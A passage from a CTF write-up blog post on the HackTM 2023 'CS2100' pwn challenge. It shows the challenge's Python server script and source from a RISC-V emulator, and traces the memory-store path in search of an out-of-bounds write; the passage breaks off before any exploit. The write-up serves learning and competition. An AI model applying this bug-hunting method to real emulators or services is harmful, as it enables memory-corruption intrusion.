<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>HackTM CTF 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="HackTM CTF 2023" />
<meta property="og:description" content="Writeup for HackTM CTF 2023 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/hacktm-ctf-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-19T20:14:37+07:00" />
<meta property="article:modified_time" content="2023-02-23T18:03:33+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="HackTM CTF 2023"/>
<meta name="twitter:description" content="Writeup for HackTM CTF 2023 by Chovid99"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/hacktm-ctf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/acsc-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "HackTM CTF 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/hacktm-ctf-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, HackTM, pwn, vm, oob, 2023","wordcount":  3724 ,
        "url": "https:\/\/chovid99.github.io\/posts\/hacktm-ctf-2023\/","datePublished": "2023-02-19T20:14:37+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTM CTF 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Feb 19, 2023">Feb 19, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3724 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;18 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cs2100">CS2100</a>
      <ul>
        <li><a href="#initial-analysis">Initial Analysis</a></li>
        <li><a href="#exploitation">Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/pGRGUGw.png" title="https://i.imgur.com/pGRGUGw.png" data-thumbnail="https://i.imgur.com/pGRGUGw.png" data-sub-html="<h2>HackTM CTF 2023</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/pGRGUGw.png"
            data-srcset="https://i.imgur.com/pGRGUGw.png, https://i.imgur.com/pGRGUGw.png 1.5x, https://i.imgur.com/pGRGUGw.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/pGRGUGw.png" />
    </a><figcaption class="image-caption">HackTM CTF 2023</figcaption>
    </figure>
<p>This weekend, I spent my time competing at HackTM CTF 2023 held by WreckTheLine with my local team <code>SKSD</code>. We got 28th place. I managed to solve one pwn challenge called <code>CS2100</code>, and this is my writeup for that challenge.</p>
<h1 id="cs2100">CS2100</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">To all my CS2100 Computer Organisation students, I hope you&#39;ve enjoyed the lectures thus far on RISC-V assembly.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I have set-up an online service for you to test your own RISC-V code!
</span></span><span class="line"><span class="cl">Simply connect to the service through tcp:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nc 34.141.16.87 10000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Credit: Thanks to `@fmash16` for his emulator! I didn&#39;t even have to compile the emulator binary myself :O https://github.com/fmash16/riscv_emulator/blob/main/main
</span></span></code></pre></td></tr></table>
</div>
</div><p>Attachment: <a href="https://drive.google.com/file/d/1fvZ0rfXOPmH_HqpG0tDVaPl45_bKmpGC/view?usp=sharing" target="_blank" rel="noopener noreffer ">https://drive.google.com/file/d/1fvZ0rfXOPmH_HqpG0tDVaPl45_bKmpGC/view?usp=sharing</a></p>
<h2 id="initial-analysis">Initial Analysis</h2>
<p>We were given a zip file contains:</p>
<ul>
<li>Binary called <code>main</code></li>
<li>File called <code>server.py</code></li>
<li>Libc binary <code>libc-2.31.so</code></li>
</ul>
<p>Let&rsquo;s check the <code>server.py</code> file first</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tempfile</span> <span class="kn">import</span> <span class="n">NamedTemporaryFile</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">check_output</span><span class="p">,</span> <span class="n">Popen</span><span class="p">,</span> <span class="n">STDOUT</span><span class="p">,</span> <span class="n">DEVNULL</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">print_banner</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">       _____  _____ ___  __  ___   ___  
</span></span></span><span class="line"><span class="cl"><span class="s2">      / ____|/ ____|__ \/_ |/ _ \ / _ \ 
</span></span></span><span class="line"><span class="cl"><span class="s2">     | |    | (___    ) || | | | | | | |
</span></span></span><span class="line"><span class="cl"><span class="s2">     | |     \___ \  / / | | | | | | | |
</span></span></span><span class="line"><span class="cl"><span class="s2">     | |____ ____) |/ /_ | | |_| | |_| |
</span></span></span><span class="line"><span class="cl"><span class="s2">      \_____|_____/|____||_|\___/ \___/ 
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">print_banner</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Please enter your code (hex-encoded):</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Remove all whitespace</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">d</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Invalid hex!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">NamedTemporaryFile</span><span class="p">()</span> <span class="k">as</span> <span class="n">temp_file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">temp_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">temp_file</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">temp_file</span><span class="o">.</span><span class="n">name</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Output:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">Popen</span><span class="p">([</span><span class="s2">&#34;./main&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">],</span> <span class="n">stderr</span><span class="o">=</span><span class="n">STDOUT</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">DEVNULL</span><span class="p">)</span> <span class="k">as</span> <span class="n">process</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">process</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ah okay, so it just read hex-encoded bytecode, stored it in a temporary file, and then pass it to the binary <code>main</code>.</p>
<p>The problem description also gives us a link to a <a href="https://github.com/fmash16/riscv_emulator/blob/main/main" target="_blank" rel="noopener noreffer ">github repo</a>. Turn out, the given binary is the compiled version of that repo, which is a riscv emulator. Instead of decompiling the binary, we can just clone the repo and try to analyze the source code.</p>
<p>I noticed that this challenge is pretty similar to RealWorld CTF 2023 challenge called <code>tinyvm</code>, where the given repo is a vm of x86 assembly implemented in C, while for this challenge, the repo tries to implement RISC-V emulator. So, based on that experience, I decided to try to look whether there might be Out-of-Bound Read and Write on the given repo, because it is the common mistake of developer during building a simulator. Let&rsquo;s first inspect the <code>main.c</code> file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Usage: rvemu &lt;filename&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Initialize cpu, registers and program counter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">CPU</span> <span class="n">cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cpu_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Read input file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">read_file</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// cpu loop
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// fetch
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">inst</span> <span class="o">=</span> <span class="nf">cpu_fetch</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Increment the program counter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">cpu</span><span class="p">.</span><span class="n">pc</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// execute
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">cpu_execute</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">dump_registers</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">cpu</span><span class="p">.</span><span class="n">pc</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*dump_registers(&amp;cpu);*/</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so basically, the file required us to input a filename, which will be loaded to the <code>CPU</code> struct, and then it will iterate the instructions we supplied in the file. Checking the <code>cpu_execute</code> implementation, the emulator implements a lot of <code>RISC-V</code> instructions.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">cpu_execute</span><span class="p">(</span><span class="n">CPU</span> <span class="o">*</span><span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">opcode</span> <span class="o">=</span> <span class="n">inst</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">;</span>           <span class="c1">// opcode in bits 6..0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">funct3</span> <span class="o">=</span> <span class="p">(</span><span class="n">inst</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">;</span>    <span class="c1">// funct3 in bits 14..12
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">funct7</span> <span class="o">=</span> <span class="p">(</span><span class="n">inst</span> <span class="o">&gt;&gt;</span> <span class="mi">25</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">;</span>   <span class="c1">// funct7 in bits 31..25
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                   <span class="c1">// x0 hardwired to 0 at each cycle
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*printf(&#34;%s\n%#.8lx -&gt; Inst: %#.8x &lt;OpCode: %#.2x, funct3:%#x, funct7:%#x&gt; %s&#34;,*/</span>
</span></span><span class="line"><span class="cl">            <span class="cm">/*ANSI_YELLOW, cpu-&gt;pc-4, inst, opcode, funct3, funct7, ANSI_RESET); // DEBUG*/</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">%#.8lx -&gt; %s&#34;</span><span class="p">,</span> <span class="n">ANSI_YELLOW</span><span class="p">,</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">pc</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span> <span class="n">ANSI_RESET</span><span class="p">);</span> <span class="c1">// DEBUG
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">LUI</span><span class="p">:</span>   <span class="nf">exec_LUI</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">AUIPC</span><span class="p">:</span> <span class="nf">exec_AUIPC</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">JAL</span><span class="p">:</span>   <span class="nf">exec_JAL</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">JALR</span><span class="p">:</span>  <span class="nf">exec_JALR</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our target is trying to look at an OOB read or write bug. So, I decided to skim for instructions that related to reading/storing value in memory. And then, I noticed this sequence of actions.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">exec_SD</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">imm</span> <span class="o">=</span> <span class="nf">imm_S</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="nf">rs1</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="n">imm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cpu_store</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="nf">rs2</span><span class="p">(</span><span class="n">inst</span><span class="p">)]);</span> <span class="c1">// &lt;- Let&#39;s expand this
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">print_op</span><span class="p">(</span><span class="s">&#34;sd</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cpu_store</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">bus_store</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">cpu</span><span class="o">-&gt;</span><span class="n">bus</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span> <span class="c1">// &lt;- Let&#39;s expand this
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">bus_store</span><span class="p">(</span><span class="n">BUS</span><span class="o">*</span> <span class="n">bus</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">dram_store</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">bus</span><span class="o">-&gt;</span><span class="n">dram</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span> <span class="c1">// &lt;- Let&#39;s expand this
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
